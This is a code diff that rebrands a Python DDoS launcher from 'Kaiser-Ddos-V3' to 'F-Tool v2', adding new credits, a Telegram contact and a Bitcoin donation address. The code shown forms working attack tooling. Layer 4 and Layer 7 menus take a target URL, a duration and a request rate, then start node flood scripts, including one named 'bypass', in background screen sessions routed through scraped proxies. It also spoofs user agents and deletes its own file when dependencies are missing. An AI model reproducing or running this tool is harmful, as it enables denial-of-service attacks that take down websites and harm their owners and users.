@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 
 """
-    TOOL BYPASS HUYKAISER PROJECT X PROCODE
-   FB : https://www.facebook.com/HuyKaiser.profile
+	 handsome list:
+		AnonPrixor ~ Yone ~ Lazercat ~ Catto ~ MrRage ~ Forky ~  Sussy Baka ~ Clowndzzy ~ Godzilla  ~ Baloo4Ever ~ fbi ~ Mrasdaas
 
 """
 from shutil import which
@@ -103,10 +103,13 @@ class Home:
 				time.sleep(1)
 
 	def home(self): # don't edit this banner lol
-		print(f"""{Color.LG}▒█░▄▀ ░█▀▀█ ▀█▀ ▒█▀▀▀█ ▒█▀▀▀ ▒█▀▀█   ▀▀█▀▀ ▒█▀▀▀█ ▒█▀▀▀█ ▒█░{Color.LB}
-            {Color.LB}▒█▀▄░ ▒█▄▄█ ▒█░ ░▀▀▀▄▄ ▒█▀▀▀ ▒█▄▄▀   ░▒█░░ ▒█░░▒█ ▒█░░▒█ ▒█░{Color.LC}
-            {Color.LC}▒█░▒█ ▒█░▒█ ▄█▄ ▒█▄▄▄█ ▒█▄▄▄ ▒█░▒█   ░▒█░░ ▒█▄▄▄█ ▒█▄▄▄█ ▒█▄▄█{Color.LG}
-    {Color.LR}[{Color.LG}>     Made with ☕ By HuyKaiser PROCODER    {Color.LG}<{Color.LR}] """)
+		print(f"""
+                        {Color.LG}╔══════════════════════╗
+    {Color.LC}╔═╗{Color.LB} ╔╦╗╔═╗╔═╗╦      {Color.LG}║ {Color.LR}Created: {Color.LY}5/3/22      {Color.LG}║
+    {Color.LC}╠╣{Color.LB}{Color.LR}───{Color.LB}║ ║ ║║ ║║      {Color.LG}║ {Color.LR}Updated: {Color.LY}8/3/22      {Color.LG}║
+    {Color.LC}╚{Color.LB}    ╩ ╚═╝╚═╝╩═╝{Color.LG}v2  {Color.LG}║ {Color.LB}Simple but mighty XD {Color.LG}║
+                        {Color.LG}╚══════════════════════╝
+    {Color.LR}[{Color.LG}>     Made with ☕ By FDc0d3 & Aya    {Color.LG}<{Color.LR}]""")
 		print(Color.LC+"    Type "+Color.LB+"'HELP'"+Color.LC+" to see all commands\n\n")
 		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" Proxy")
 		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" WebTool")
@@ -115,7 +118,7 @@ class Home:
 		print("\n")
 		while True:
 			try:
-				sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"Kaiser"+Color.LB+"@"+Color.LG+"Home"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
+				sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Home"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
 				option = input()
 				if option in ['01', '1']:
 					os.system('clear')
@@ -134,13 +137,13 @@ class Home:
 				elif option in ['home', 'HOME']:
 					self.home()
 				elif option in ['clear', 'CLEAR']:
-					os.system('clear');Kaiser.home()
+					os.system('clear');F_Tool.home()
 				elif option in ['help', 'HELP', '?']:
 					print(self.help)
 				elif option in ['dev', 'DEV']:
 					print(self.dev)
 				elif option in ['exit', 'EXIT']:
-					subprocess.run(['pkill -f Kaiser.py'], shell=True)
+					subprocess.run(['pkill -f F-Tool.py'], shell=True)
 				elif option in ['stop', 'STOP']:
 					subprocess.run(['pkill screen'], shell=True)
 					print(f"{Color.LG} [!] Attack Stopped!")
@@ -277,9 +280,9 @@ class Tool:
 			sys.exit(f"{Color.LR}ERROR:{Color.RESET} File: 'utils' NotFound")
 		if new in ['ref', 'REF', 'clear', 'CLEAR']:
 			os.system('clear')
-			Kaiser.styleText("[*] Đang Cập Nhật Proxy Ddos...")
+			F_Tool.styleText("[*] Downloading New Proxy...")
 		else:
-			Kaiser.styleText("[*] Đã Cập Nhật All Proxy Ddos...")
+			F_Tool.styleText("[*] Downloading All Proxy...")
 		try:
 			for proxy in readjson['Proxies']:
 				if proxy['type'] == 1:
@@ -313,7 +316,7 @@ class Tool:
 		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" SOCKS5 PROXY")
 		print("\n")
 		while True:
-				sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"Kaiser"+Color.LB+"@"+Color.LG+"Proxy"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
+				sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Proxy"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
 				option = input()
 				if option in ['01', '1']:
 					with open("http.txt", 'w') as p:
@@ -334,7 +337,7 @@ class Tool:
 				elif option in ['ref', 'REF']:
 					self.proxy(option)
 				elif option in ['home', 'HOME']:
-					Kaiser.home()
+					F_Tool.home()
 				elif option in ['clear', 'CLEAR']:
 					os.system('clear')
 					self.proxy(option)
@@ -343,7 +346,7 @@ class Tool:
 				elif option in ['dev', 'DEV']:
 					print(self.dev)
 				elif option in ['exit', 'EXIT']:
-					subprocess.run(['pkill -f Kaiser.py'], shell=True)
+					subprocess.run(['pkill -f F-Tool.py'], shell=True)
 				elif option in ['stop', 'STOP']:
 					subprocess.run(['pkill screen'], shell=True)
 					print(f"{Color.LG} [!] Attack Stopped!")
@@ -372,7 +375,7 @@ class Tool:
 		print(Color.LR+"["+Color.LG+"05"+Color.LR+"]"+Color.LC+" EXTRACT LINK")
 		print("\n")
 		while True:
-			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"Kaiser"+Color.LB+"@"+Color.LG+"Webtool"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
+			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Webtool"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
 			option = input()
 			if option in ['01', '1']:
 				while True:
@@ -416,7 +419,7 @@ class Tool:
 			elif option in ['ref', 'REF']:
 				self.webtools()
 			elif option in ['home', 'HOME']:
-				Kaiser.home()
+				F_Tool.home()
 			elif option in ['clear', 'CLEAR']:
 				os.system('clear');self.webtools()
 			elif option in ['help', 'HELP', '?']:
@@ -424,7 +427,7 @@ class Tool:
 			elif option in ['dev', 'DEV']:
 				print(self.dev)
 			elif option in ['exit', 'EXIT']:
-				subprocess.run(['pkill -f Kaiser.py'], shell=True)
+				subprocess.run(['pkill -f F-Tool.py'], shell=True)
 			elif option in ['stop', 'STOP']:
 				subprocess.run(['pkill screen'], shell=True)
 				print(f"{Color.LG} [!] Attack Stopped!")
@@ -488,14 +491,14 @@ class Tool:
 		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" Layer7")
 		print("\n")
 		while True:
-			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"Kaiser"+Color.LB+"@"+Color.LG+"L4/L7/BBoS"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
+			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"L4/L7/BBoS"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
 			option = input()
 			if option in ['01', '1']:
 				os.system('clear');self.l4()
 			elif option in ['02', '2']:
 				os.system('clear');self.l7()
 			elif option in ['home', 'HOME']:
-				Kaiser.home()
+				F_Tool.home()
 			elif option in ['clear', 'CLEAR']:
 				os.system('clear');self.bbos()
 			elif option in ['help', 'HELP', '?']:
@@ -503,7 +506,7 @@ class Tool:
 			elif option in ['dev', 'Dev']:
 				print(self.dev)
 			elif option in ['exit', 'EXIT']:
-				subprocess.run(['pkill -f Kaiser.py'], shell=True)
+				subprocess.run(['pkill -f F-Tool.py'], shell=True)
 			elif option in ['stop', 'STOP']:
 				subprocess.run(['pkill screen'], shell=True)
 				print(f"{Color.LG} [!] Attack Stopped!")
@@ -532,7 +535,7 @@ class Tool:
 		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Return")
 		print("\n")
 		while True:
-			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"Kaiser"+Color.LB+"@"+Color.LG+"Layer4"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
+			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Layer4"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
 			option = input()
 			if option in ['01', '1']:
 				try:
@@ -588,7 +591,7 @@ class Tool:
 			elif option in ['ref', 'REF']:
 				self.l4()
 			elif option in ['home', 'HOME']:
-				Kaiser.home()
+				F_Tool.home()
 			elif option in ['clear', 'CLEAR']:
 				os.system('clear');self.l4()
 			elif option in ['help', 'HELP', '?']:
@@ -596,7 +599,7 @@ class Tool:
 			elif option in ['dev', 'DEV']:
 				print(self.dev)
 			elif option in ['exit', 'EXIT']:
-				subprocess.run(['pkill -f Kaiser.py'], shell=True)
+				subprocess.run(['pkill -f F-Tool.py'], shell=True)
 			elif option in ['stop', 'STOP']:
 				subprocess.run(['pkill screen'], shell=True)
 				print(f"{Color.LG} [!] Attack Stopped!")
@@ -626,14 +629,14 @@ class Tool:
 		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Return")
 		print("\n")
 		while True:
-			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"Kaiser"+Color.LB+"@"+Color.LG+"Layer7"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
+			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Layer7"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
 			option = input()
 			if option in ['01', '1']:
 				try:
 					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
 					reqs = int(input(f"{Color.LG} [>] Reqs(200): "+Color.RESET))
-					Kaiser.getproxies();subprocess.run([f'screen -dm node utils/L7/socket {url} utils/http.txt {floodtime} {reqs}'], shell=True)
+					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/socket {url} utils/http.txt {floodtime} {reqs}'], shell=True)
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
@@ -641,7 +644,7 @@ class Tool:
 				try:
 					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
-					Kaiser.getproxies();subprocess.run([f'screen -dm node utils/L7/https1 GET {url} utils/http.txt {floodtime} 64 1'], shell=True)
+					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/https1 GET {url} utils/http.txt {floodtime} 64 1'], shell=True)
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
@@ -649,7 +652,7 @@ class Tool:
 				try:
 					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
-					Kaiser.getproxies();subprocess.run([f'screen -dm node utils/L7/bypass {url} {floodtime}'], shell=True)
+					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/bypass {url} {floodtime}'], shell=True)
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
@@ -657,14 +660,14 @@ class Tool:
 				try:
 					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
-					Kaiser.getproxies();subprocess.run([f'screen -dm node utils/L7/https2 {url} {floodtime} 1'], shell=True)
+					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/https2 {url} {floodtime} 1'], shell=True)
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
 			elif option in ['ref', 'REF']:
 				self.l7()
 			elif option in ['home', 'HOME']:
-				Kaiser.home()
+				F_Tool.home()
 			elif option in ['clear', 'CLEAR']:
 				os.system('clear')
 				self.l7()
@@ -673,7 +676,7 @@ class Tool:
 			elif option in ['dev', 'DEV']:
 				print(self.dev)
 			elif option in ['exit', 'EXIT']:
-				subprocess.run(['pkill -f Kaiser.py'], shell=True)
+				subprocess.run(['pkill -f F-Tool.py'], shell=True)
 			elif option in ['stop', 'STOP']:
 				subprocess.run(['pkill screen'], shell=True)
 				print(f"{Color.LG} [!] Attack Stopped!")
@@ -717,18 +720,18 @@ def spoof_useragents():
 
 def main():
 	#  checking if you're gay 😏
-	Kaiser.styleText("[+] Checking Dependencies...\n\n")
+	F_Tool.styleText("[+] Checking Dependencies...\n\n")
 	pkgs = ['screen', 'node']
 	install = True
 	for pkg in pkgs:
 		ur_mom = which(pkg)
 		if ur_mom == None:
-			Kaiser.styleText(f"[!] {pkg} is not installed!\n")
+			F_Tool.styleText(f"[!] {pkg} is not installed!\n")
 			install = False
 		else:
 			pass
 	if install == False:
-		sys.exit(f'\n[?] Error? try:{Color.LG} sh HuyKaiserDZ.sh')
+		sys.exit(f'\n[?] Error? try:{Color.LG} sh install.sh')
 	else:pass
 	try:
 		script = True
@@ -736,11 +739,11 @@ def main():
 	except IsADirectoryError:pass
 	except FileNotFoundError:
 		print(f"{Color.LR}[CRITICAL ERROR]:{Color.RESET} File: 'utils' NotFound")
-		print("\n[+] Please download on GitHub, or git clone: https://github.com/HuyKaiserDZ/KAISER-DDOS-V3.git\n")
+		print("\n[+] Please download on GitHub, or git clone: https://github.com/FDc0d3/F-Tool.git\n")
 		os.remove(f'{__file__}')
 		script = False
 	if script == False:sys.exit()
-	else:Kaiser.home()
+	else:F_Tool.home()
 
 
 if __name__ == '__main__':
@@ -751,8 +754,9 @@ if __name__ == '__main__':
 {Color.LC}BBOS{Color.LR} ~> {Color.LY}L4/L7 DDOS Attack
 {Color.LC}STOP{Color.LR} ~> {Color.LY}Stop your Attack
 {Color.LC}DEV{Color.LR} ~> {Color.LY}Contact/Support dev"""
-	dev = f"""{Color.LC}Telegram{Color.LR}: {Color.LY}https://t.me/HuyKaiser"""
-	Kaiser = Home(commands, dev)
+	dev = f"""{Color.LC}Telegram{Color.LR}: {Color.LY}https://t.me/FDc0d3
+{Color.LC}New[BTC]Address{Color.LR}: {Color.LY}32FGCnt4uwkkByWuH8V4qyCSfynm1iVsmB"""
+	F_Tool = Home(commands, dev)
 	Tool = Tool(commands, dev, spoof_useragents())
-	try:open('Kaiser-Ddos-V3.py');main()
+	try:open('F-Tool.py');main()
 	except:quit()
